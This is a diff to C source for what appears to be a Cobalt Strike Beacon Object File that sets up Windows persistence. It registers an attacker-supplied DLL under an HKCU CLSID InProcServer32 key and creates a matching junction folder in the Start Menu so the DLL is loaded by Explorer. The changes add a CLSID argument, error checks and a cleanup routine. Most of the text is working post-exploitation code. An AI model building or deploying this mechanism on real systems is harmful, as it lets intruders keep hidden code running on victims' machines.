@@ -20,6 +20,7 @@ WINBASEAPI RPC_STATUS WINAPI RPCRT4$RpcStringFreeW(RPC_WSTR* String);
 
 WINBASEAPI wchar_t* __cdecl MSVCRT$wcscat(wchar_t* dest, const wchar_t* src);
 WINBASEAPI size_t __cdecl MSVCRT$wcslen(const wchar_t* str);
+WINBASEAPI wchar_t* __cdecl MSVCRT$wcscpy(wchar_t* dest, const wchar_t* src);
 
 WINBASEAPI HRESULT WINAPI SHELL32$SHGetKnownFolderPath(GUID* rfid, DWORD dwFlags, HANDLE hToken, PWSTR* ppszPath);
 
@@ -442,13 +443,12 @@ BOOL PrintMonitorPersistence(int cmd, wchar_t* monName, wchar_t* dllname)
 #endif
 #ifdef JUNCTION
 
-BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath)
+BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath, wchar_t* CLSID)
 {
 	LSTATUS status = -1;
 	HKEY phkResult = 0;
-	DWORD dwDisposition = 0;
 	BOOL success = TRUE;
-	wchar_t* startupPath = NULL;
+	WCHAR* startupPath = NULL;
 
 	UUID myuid;
 	RPC_WSTR uidstr;
@@ -460,12 +460,15 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath)
 
 	//%APPDATA%\Microsoft\Windows\Start Menu
 	hRes = SHELL32$SHGetKnownFolderPath(&xFOLDERID_StartMenu, 0, NULL, &startupPath);
-	MSVCRT$wcscat(startupPath, L"\\");
+	if (hRes != 0)
+	{
+		BeaconPrintf(CALLBACK_ERROR, "Could not find known folder ID\n");
+		return FALSE;
+	}
+
 	MSVCRT$wcscat(startupPath, L"\\Programs\\Accessories\\");
 	MSVCRT$wcscat(startupPath, folderName);
-	MSVCRT$wcscat(startupPath, L".{");
-	MSVCRT$wcscat(startupPath, uidstr);
-	MSVCRT$wcscat(startupPath, L"}");
+
 
 
 	if (clean == 0)
@@ -475,20 +478,27 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath)
 		RPCRT4$UuidToStringW(&myuid, &uidstr);
 		MSVCRT$wcscat(pFullKeyPath, uidstr);
 		MSVCRT$wcscat(pFullKeyPath, inproc);
+		MSVCRT$wcscat(pFullKeyPath, L"\0");
+
+		MSVCRT$wcscat(startupPath, L".{");
+		MSVCRT$wcscat(startupPath, uidstr);
+		MSVCRT$wcscat(startupPath, L"}");
+		MSVCRT$wcscat(startupPath, L"\0");
 
 		//Add new subkeys
-		status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, pFullKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY, NULL, &phkResult, &dwDisposition);
-		if (status)
+		status = ADVAPI32$RegCreateKeyExW(HKEY_CURRENT_USER, pFullKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY, NULL, &phkResult, NULL);
+		if (0 != status)
 		{
 			BeaconPrintf(CALLBACK_ERROR, "RegCreateKeyExW has failed\n");
-			ADVAPI32$RegCloseKey(phkResult);
 			success = FALSE;
 		}
 		if (success)
 		{
 			WCHAR lpValueName[] = L"";
-			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, lpValueName, REG_EXPAND_SZ, dllPath, MSVCRT$wcslen(dllPath) * 2 + 1);
-			if (status)
+			MSVCRT$wcscat(dllPath, L"\0");
+			size_t len = MSVCRT$wcslen(dllPath) * 2 + 1;
+			status = ADVAPI32$RegSetKeyValueW(HKEY_CURRENT_USER, pFullKeyPath, lpValueName, REG_EXPAND_SZ, dllPath, (DWORD)len);
+			if (0 != status)
 			{
 				BeaconPrintf(CALLBACK_ERROR, "RegSetKeyValueW has failed\n");
 				ADVAPI32$RegCloseKey(phkResult);
@@ -496,36 +506,76 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath)
 			}
 
 		}
+
 		if (success)
 		{
 			BeaconPrintf(CALLBACK_OUTPUT, "[*] Key Created Software\\Classes\\CLSID\\%ls\\InProcServer32", uidstr);
 
-
 			//Add our junction folder
-			if (!KERNEL32$CreateDirectoryW(startupPath, NULL) && ERROR_ALREADY_EXISTS != KERNEL32$GetLastError())
+			success = KERNEL32$CreateDirectoryW(startupPath, NULL);
+			if (!success)
 			{
-				BeaconPrintf(CALLBACK_ERROR, "Couldn't create target folder\n");
-				success = FALSE;
-			}
-			else
-				BeaconPrintf(CALLBACK_OUTPUT, "[*]Created File %ls\n", startupPath);
 
+				BeaconPrintf(CALLBACK_ERROR, "Couldn't create target folder");
+				success = FALSE;
+
+			}
+			BeaconPrintf(CALLBACK_OUTPUT, "[*]Created File %ls", startupPath);
+			
 
 		}
+
+		ADVAPI32$RegCloseKey(phkResult);
 		RPCRT4$RpcStringFreeW(&uidstr);
 	}
 	else if (clean == 1)
 	{
-		MSVCRT$wcscat(pFullKeyPath, dllPath);
+
+		MSVCRT$wcscat(startupPath, L".{");
+		MSVCRT$wcscat(startupPath, CLSID);
+		MSVCRT$wcscat(startupPath, L"}");
+		MSVCRT$wcscat(startupPath, L"\0");
+		BeaconPrintf(CALLBACK_ERROR, "Trying to clean startup path %ls\n", startupPath);
+
+		wchar_t baseKeyPath[512] = {0};
+
+		MSVCRT$wcscat(pFullKeyPath, CLSID);
+	
+		//Need this to delete top key
+		MSVCRT$wcscpy(baseKeyPath, pFullKeyPath);
+		MSVCRT$wcscat(baseKeyPath, L"}");
+		MSVCRT$wcscat(baseKeyPath, L"\0");
+
+		//Need this to delete subkey
+		MSVCRT$wcscat(pFullKeyPath, inproc);
 		MSVCRT$wcscat(pFullKeyPath, L"\0");
-		status = ADVAPI32$RegDeleteKeyW(HKEY_LOCAL_MACHINE, pFullKeyPath);
+		BeaconPrintf(CALLBACK_ERROR, "Trying to clean reg key %ls \n", pFullKeyPath);
+
+
+		status = ADVAPI32$RegDeleteKeyW(HKEY_CURRENT_USER, pFullKeyPath);
 		if (status)
 		{
 			BeaconPrintf(CALLBACK_ERROR, "RegDeleteKey has failed\n");
 			success = FALSE;
 		}
 		else
-			BeaconPrintf(CALLBACK_OUTPUT, "Successfully deleted %ls\n", pFullKeyPath);
+		{
+
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", pFullKeyPath);
+		}
+
+
+		status = ADVAPI32$RegDeleteKeyW(HKEY_CURRENT_USER, baseKeyPath);
+		if (status)
+		{
+			BeaconPrintf(CALLBACK_ERROR, "RegDeleteKey has failed\n");
+			success = FALSE;
+		}
+		else
+		{
+
+			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", baseKeyPath);
+		}
 
 		if (!KERNEL32$RemoveDirectoryW(startupPath))
 		{
@@ -533,20 +583,23 @@ BOOL JunctionFolder(int clean, wchar_t* folderName, wchar_t* dllPath)
 			success = FALSE;
 		}
 		else
-			BeaconPrintf(CALLBACK_OUTPUT, "Successfully deleted %ls\n", startupPath);
+		{
+			BeaconPrintf(CALLBACK_OUTPUT, "[+]Successfully deleted %ls\n", startupPath);
+		}
 		if (!KERNEL32$DeleteFileW((LPCWSTR)dllPath))
 		{
 			success = FALSE;
 			BeaconPrintf(CALLBACK_ERROR, "Could not delete %ls, Error: %d\n", dllPath, KERNEL32$GetLastError());
 		}
 		else
+		{
 			BeaconPrintf(CALLBACK_OUTPUT, "[+] Successfully deleted %ls\n", dllPath);
+		}
 
 	}
 
 
-	if (phkResult)
-		ADVAPI32$RegCloseKey(phkResult);
+
 	return success;
 }
 #endif
@@ -640,8 +693,10 @@ void go(char* args, int length) {
 
 	wchar_t* regName = NULL;
 	wchar_t* dllName = NULL;
+	wchar_t* clsid = NULL;
 	int szDllName = 0;
 	int szRegName = 0;
+	int szClsid = 0;
 	DWORD arg = 0;
 	datap  parser;
 
@@ -682,13 +737,15 @@ void go(char* args, int length) {
 
 #endif
 #ifdef JUNCTION
+	clsid = (wchar_t*)BeaconDataExtract(&parser, &szClsid);
 
-	if (!JunctionFolder(arg, regName, dllName))
+	if (!JunctionFolder(arg, regName, dllName, clsid))
 	{
 		BeaconPrintf(CALLBACK_ERROR, "Something went wrong!\n");
 		return;
 	}
 #endif
 	BeaconPrintf(CALLBACK_OUTPUT, "[*] Success!\n");
+	return;
 }
 
